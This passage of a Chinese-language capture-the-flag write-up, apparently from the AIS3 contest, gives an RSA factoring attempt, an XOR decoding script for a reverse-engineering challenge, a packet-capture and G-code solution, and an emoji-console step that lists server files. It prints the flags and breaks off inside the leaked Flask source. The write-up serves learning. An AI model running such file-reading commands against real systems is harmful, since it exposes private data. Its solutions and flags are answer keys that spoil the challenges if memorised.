class="number">1</span></span><br><span class="line">    b = a**<span class="number">2</span> - n</span><br><span class="line">    <span class="built_in">round</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> gmpy2.iroot(b, <span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">round</span> += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Round <span class="subst">&#123;<span class="built_in">round</span>&#125;</span>: a = <span class="subst">&#123;a&#125;</span>, b = <span class="subst">&#123;b&#125;</span>&quot;</span>, end=<span class="string">&quot;\r&quot;</span>)</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        b = a**<span class="number">2</span> - n</span><br><span class="line">    b = gmpy2.iroot(b, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> (a + b, a - b)</span><br></pre></td></tr></table></figure><p>可是我開始運行之後很久都還是沒分解出$p$跟$q$，可能是因為$p$和$|p-q|$其實不小吧。</p><h3 id="Wiener’s-attack"><a href="#Wiener’s-attack" class="headerlink" title="Wiener’s attack"></a>Wiener’s attack</h3><p>這邊我是使用了<a href="https://github.com/pablocelayes/rsa-wiener-attack">這個工具</a>來嘗試破解，不過也是失敗，估計是$e$還不夠大，所以$d$還不夠小吧。雖然這題最後沒解出來讓我傷心了很久(因為我賽前還特別去練習了 RSA 的題目結果居然解不出 baby!!!)，但希望這傷心可以轉化為動力，讓我繼續學習！對自己的小期許就是下次甚麼 RSA 一定要寫出來啦啦啦！😠</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="The-Long-Print"><a href="#The-Long-Print" class="headerlink" title="The Long Print"></a>The Long Print</h2><p>題目給了我們一個二進制文件，然後又是出題在 Reverse 類別，所以就理所當然地把檔案用<a href="https://hex-rays.com/ida-free/">IDA</a>打開來看看吧！</p><p><img src="https://hackmd.io/_uploads/HJprW1oNR.png" alt="IDA打開的樣子"></p><p>點開之後我們就會看到一堆很可怕的東西，所以趕快按下我們的 tab&#x2F;F5 讓 IDA 幫我們 Decompile 一下。</p><p><img src="https://hackmd.io/_uploads/SkydbyjVR.png" alt="IDA Decompile"></p><p>這樣看起來平易近人多了。那我們就一步一步跟隨著這個程式研究一下他到底如何運作的。為了寫的詳細點我把代碼放上來加點註解解釋一下(寫一起感覺比較清楚)，如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hope you have enough time to receive my flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; i += <span class="number">2</span> ) <span class="comment">// 從i = 0到i &gt; 23，步長為2，共12循環</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// *(_DWORD *)&amp;secret[4 * i]: 從secret的第4 * i個字節開始提取4個字節的整數</span></span><br><span class="line">    <span class="comment">// *(unsigned int *)&amp;secret[4 * i + 4]: 從secret的第4 * i + 4個字節開始提取4個字節的整數</span></span><br><span class="line">    <span class="comment">// 再用上面的那個東西作為索引，從key中提取出相對應的值</span></span><br><span class="line">    <span class="comment">// 把兩個整數做XOR並賦值給v4</span></span><br><span class="line">    v4 = *(_DWORD *)&amp;secret[<span class="number">4</span> * i] ^ key[*(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;secret[<span class="number">4</span> * i + <span class="number">4</span>]];</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      sleep(<span class="number">0x3674</span>u); <span class="comment">// 休眠一段時間</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, v4); <span class="comment">// 輸出v4的最低位字節作為字符</span></span><br><span class="line">      v4 &gt;&gt;= <span class="number">8</span>; <span class="comment">// v4向右移8個bits == 一個byte == 一個字節，把剛剛輸出過的字節丟棄</span></span><br><span class="line">      fflush(_bss_start); <span class="comment">// 刷新輸出緩衝區</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\rOops! Where is the flag? I am sure that the flag is already printed!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理解了這段程式碼後，第一件事當然是去看看這個 secret 跟 key 到底是甚麼東西囉。在 secret 上點兩下，然後點選 hex view 之後，發現了神奇的東西。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">46 41 4B 45 0B 00 00 00  7B 68 6F 6F 0A 00 00 00  FAKE....&#123;hoo....</span><br><span class="line">72 61 79 5F 02 00 00 00  73 74 72 69 08 00 00 00  ray_....stri....</span><br><span class="line">6E 67 73 5F 06 00 00 00  69 73 5F 61 05 00 00 00  ngs_....is_a....</span><br><span class="line">6C 77 61 79 07 00 00 00  73 5F 61 6E 04 00 00 00  lway....s_an....</span><br><span class="line">5F 75 73 65 09 00 00 00  66 75 6C 5F 00 00 00 00  _use....ful_....</span><br><span class="line">63 6F 6D 6D 01 00 00 00  61 6E 7A 7D 03 00 00 00  comm....anz&#125;....</span><br></pre></td></tr></table></figure><p>我當時瞬間以為這就是 flag，提交了之後，想當然，沒那麼簡單 🥹。所以繼續往下看看。這樣看起來剛剛那串東西就是我們需要的 secret 了。再來我們在 key 上面點兩下，就可以發現 key 的值是下面這樣:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000002080 key             dd 3A011001h, 4C4C1B0Dh, 3A0B002Dh, 454F40h, 3104321Ah</span><br><span class="line">.rodata:0000000000002080                                         ; DATA XREF: main+6A↑o</span><br><span class="line">.rodata:0000000000002094                 dd 3E2D161Dh, 2C120A31h, 0D3E1103h, 0C1A002Ch, 41D1432h</span><br><span class="line">.rodata:00000000000020A8                 dd 1A003100h, 76180807h</span><br></pre></td></tr></table></figure><p>接下來，我們就只要照題目所做的把它 print 出來就行了(除了 sleep 跟 fflush 的部分)，exploit 腳本如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">secret = [</span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;F&quot;</span>),</span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>),</span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;K&quot;</span>),</span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;E&quot;</span>),</span><br><span class="line">    <span class="number">0x0B</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;&#123;&quot;</span>),</span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;h&quot;</span>),</span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;o&quot;</span>),</span><br><span class="line">    <span class="built_in">ord</span>(<span class="string">&quot;o&quot;</span>),</span><br><span class="line">    <span class="number">0x0A</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x72</span>,</span><br><span class="line">    <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x74</span>,</span><br><span class="line">    <span class="number">0x72</span>,</span><br><span class="line">    <span class="number">0x69</span>,</span><br><span class="line">    <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6E</span>,</span><br><span class="line">    <span class="number">0x67</span>,</span><br><span class="line">    <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x06</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x69</span>,</span><br><span class="line">    <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x77</span>,</span><br><span class="line">    <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0x07</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x6E</span>,</span><br><span class="line">    <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x65</span>,</span><br><span class="line">    <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x66</span>,</span><br><span class="line">    <span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x63</span>,</span><br><span class="line">    <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0x6D</span>,</span><br><span class="line">    <span class="number">0x6D</span>,</span><br><span class="line">    <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0x6E</span>,</span><br><span class="line">    <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0x7D</span>,</span><br><span class="line">    <span class="number">0x03</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key = [</span><br><span class="line">    <span class="number">0x3A011001</span>,</span><br><span class="line">    <span class="number">0x4C4C1B0D</span>,</span><br><span class="line">    <span class="number">0x3A0B002D</span>,</span><br><span class="line">    <span class="number">0x00454F40</span>,</span><br><span class="line">    <span class="number">0x3104321A</span>,</span><br><span class="line">    <span class="number">0x3E2D161D</span>,</span><br><span class="line">    <span class="number">0x2C120A31</span>,</span><br><span class="line">    <span class="number">0x0D3E1103</span>,</span><br><span class="line">    <span class="number">0x0C1A002C</span>,</span><br><span class="line">    <span class="number">0x041D1432</span>,</span><br><span class="line">    <span class="number">0x1A003100</span>,</span><br><span class="line">    <span class="number">0x76180807</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">24</span>, <span class="number">2</span>):</span><br><span class="line">        part1 = <span class="built_in">int</span>.from_bytes(secret[<span class="number">4</span> * i : <span class="number">4</span> * i + <span class="number">4</span>], byteorder=<span class="string">&quot;little&quot;</span>)  <span class="comment"># 小端序</span></span><br><span class="line">        index = <span class="built_in">int</span>.from_bytes(</span><br><span class="line">            secret[<span class="number">4</span> * i + <span class="number">4</span> : <span class="number">4</span> * i + <span class="number">8</span>], byteorder=<span class="string">&quot;little&quot;</span></span><br><span class="line">        )  <span class="comment"># 小端序</span></span><br><span class="line">        v4 = part1 ^ key[index]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            c = (v4 &gt;&gt; (<span class="number">8</span> * j)) &amp; <span class="number">0xFF</span></span><br><span class="line">            result += <span class="built_in">chr</span>(c)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decode())</span><br></pre></td></tr></table></figure><p>執行之後 flag 就被 print 出來啦！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;You_are_the_master_of_time_management!!!!?&#125;</span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p>因為 Pwn 的部分比較都只是看看題目然後沒有頭緒，或是有頭緒但是不知道該如何做起，再加上到了很晚才去碰 Pwn 的題目，所以就都比較沒有進展，就不寫出來了。</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Three-Dimensional-Secret"><a href="#Three-Dimensional-Secret" class="headerlink" title="Three Dimensional Secret"></a>Three Dimensional Secret</h2><blockquote><p><em>封包分析</em></p></blockquote><p>這題給了一個<code>capture.pcapng</code>，所以我們先用 Wireshark 把檔案給打開來，看看他葫蘆裡賣的是甚麼藥。<img src="https://hackmd.io/_uploads/r1EEdx9VR.png" alt="image"><br>在圖片中我們可以看到超級多的 TCP 封包，我一開始還不太知道接下來該怎麼做，但我在翻了一下<a href="https://www.books.com.tw/products/0010884220">這本書</a>之後就找到解法了！</p><p>首先我們先對著這坨 TCP 封包點右鍵，會出現一個選項叫做 Follow，如圖:</p><p><img src="https://hackmd.io/_uploads/SJkMtl5NA.png" alt="Wireshark"></p><p>然後我們把它點下去，然後再選擇 TCP Stream，就可以看到 Wireshark 所解析出來的內容，如下:</p><p><img src="https://hackmd.io/_uploads/SkGcFx5N0.png"></p><p>因為之前忘記在哪裡刷提的時候有寫過類似的題目，所以我知道這串看不懂的字其實是一個叫做 Gcode 的東西，它是用來控制工業中的一些自動工具機的代碼。因為太長了，所以我只放一小部分在下面。Gcode 就長下面這樣。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">G0 X171.826 Y145.358</span><br><span class="line">G0 X171.773 Y144.928</span><br><span class="line">G0 X171.082 Y142.074</span><br><span class="line">G0 X171.877 Y141.336</span><br><span class="line">G0 X172.029 Y138.178</span><br><span class="line">G0 X172.802 Y136.983</span><br><span class="line">;TYPE:WALL-INNER</span><br><span class="line">G1 F1500 E2061.27916</span><br><span class="line">G1 F21000 X173.166 Y136.922 E2061.89293</span><br><span class="line">G1 X173.47 Y136.79 E2062.44409</span><br><span class="line">G1 X173.747 Y136.571 E2063.03132</span><br><span class="line">G1 X173.95 Y136.281 E2063.62001</span><br><span class="line">G1 X174.046 Y135.929 E2064.22677</span><br><span class="line">G1 X174.043 Y135.473 E2064.98511</span><br></pre></td></tr></table></figure><p>既然已經知道了他是 Gcode，我們就趕快來找一個線上的 Viewer 來看看他生作圓還是扁吧！我使用的網站是<a href="https://ncviewer.com/">這個</a>。把那串代碼放上去後，就點一下圖中的 Plot 來看看！</p><p><img src="https://hackmd.io/_uploads/HJA09l9N0.png"></p><p>點下去後發現居然沒有東西，我直接愣在原地被硬控三秒鐘。難道是我想錯了嗎！！！在慌亂之中，我趕緊調整視角，終於發現了偷偷躲在旁邊的 Flag，如下:</p><p><img src="https://hackmd.io/_uploads/SyqholcNR.png"></p><p>(然後因為我偷懶+怕打錯字所以用了 OCR 把它的文字題取出來)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;b4d1y_tun3d PriN73r&#125;</span><br></pre></td></tr></table></figure><h2 id="Emoji-Console"><a href="#Emoji-Console" class="headerlink" title="Emoji Console"></a>Emoji Console</h2><p>這題點進去後發現是長下面這樣，是由很多 Emoji 所組成的一個 Console，也難怪題目就叫這名字 XD。</p><p><img src="https://hackmd.io/_uploads/Hyj42rsEC.png"></p><p>在這邊，我嘗試點了一些不同的 emoji，發現會對應到右邊不同的字符，組成不同的命令，所以我先用了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🐱 ⭐</span><br></pre></td></tr></table></figure><p>把當前目錄下的所有東西都 cat 出來看看，果然看到了題目的腳本內容。如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, send_file, request, redirect, jsonify, render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span 